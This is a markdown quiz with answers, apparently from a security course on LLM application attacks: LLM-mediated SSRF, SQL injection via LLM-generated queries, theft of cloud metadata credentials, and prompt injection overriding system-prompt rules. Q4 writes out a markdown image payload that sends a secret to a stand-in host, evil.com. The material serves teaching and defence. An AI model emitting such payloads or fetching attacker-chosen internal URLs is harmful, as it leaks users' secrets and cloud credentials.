# 📝 Knowledge Check

---

### Q1. What makes LLM-mediated SSRF different from traditional SSRF?

<details>
<summary>Answer</summary>
In traditional SSRF, the attacker exploits a specific URL parameter that
the server fetches. In LLM-mediated SSRF, the attacker manipulates the
LLM's natural language output to generate a URL that the backend then
fetches. The attack surface is much broader because there are infinite
ways to prompt the LLM into producing the desired URL.
</details>

---

### Q2. An application uses an LLM to generate SQL queries from natural language. The generated SQL is executed directly. What vulnerability does this create?

- A) SSRF
- B) SQL Injection via LLM output
- C) Prompt Leakage
- D) Indirect Injection

<details>
<summary>Answer</summary>
**B** — SQL Injection via LLM Output. The LLM's output is treated as
trusted SQL, but an attacker can manipulate the LLM to generate malicious
SQL (DROP TABLE, UNION SELECT, etc.). This is a form of output exploitation
where the backend acts on LLM output without validation.
</details>

---

### Q3. Why is `http://169.254.169.254` significant in cloud SSRF attacks?

<details>
<summary>Answer</summary>
169.254.169.254 is the AWS/GCP/Azure Instance Metadata Service (IMDS).
It's only accessible from within the cloud instance. If an attacker can
make the server request this address, they can steal IAM credentials,
instance metadata, and potentially escalate to full cloud account access.
This is the most impactful SSRF target in cloud environments.
</details>

---

### Q4. A chatbot renders LLM output as markdown. An attacker tricks the LLM into outputting `![img](https://evil.com/steal?data=SECRET)`. What happens?

<details>
<summary>Answer</summary>
If the chat UI renders markdown images, the user's browser makes a GET
request to `evil.com/steal?data=SECRET`. The attacker's server receives
the secret in the URL query parameter. This is **data exfiltration via
markdown image rendering** — the LLM generates the exfiltration payload,
and the browser executes it.
</details>

---

### Q5. True or False: Telling the LLM "never fetch internal URLs" in the system prompt is a reliable defense against SSRF.

<details>
<summary>Answer</summary>
**False.** System prompt rules can be overridden via prompt injection
(direct or indirect). The only reliable defense is **server-side URL
validation** — an allowlist in the backend code that blocks internal
addresses regardless of what the LLM outputs. Never rely on the LLM
to enforce security boundaries.
</details>

---

### Q6. An autonomous AI agent has tools for: browsing URLs, reading files, sending emails, and executing Python code. Rank these from most to least dangerous in terms of output exploitation.

<details>
<summary>Answer</summary>
1. **Execute Python code** — Full RCE, game over
2. **Browse URLs** — SSRF to internal services, cloud metadata theft
3. **Send emails** — Data exfiltration, phishing from trusted addresses
4. **Read files** — Local file disclosure, potential credential theft

All are dangerous, but code execution gives the attacker the most
capability. The principle: every tool multiplies the attack surface.
</details>

---

**Proceed to [03-prove/](../03-prove/) when ready.**
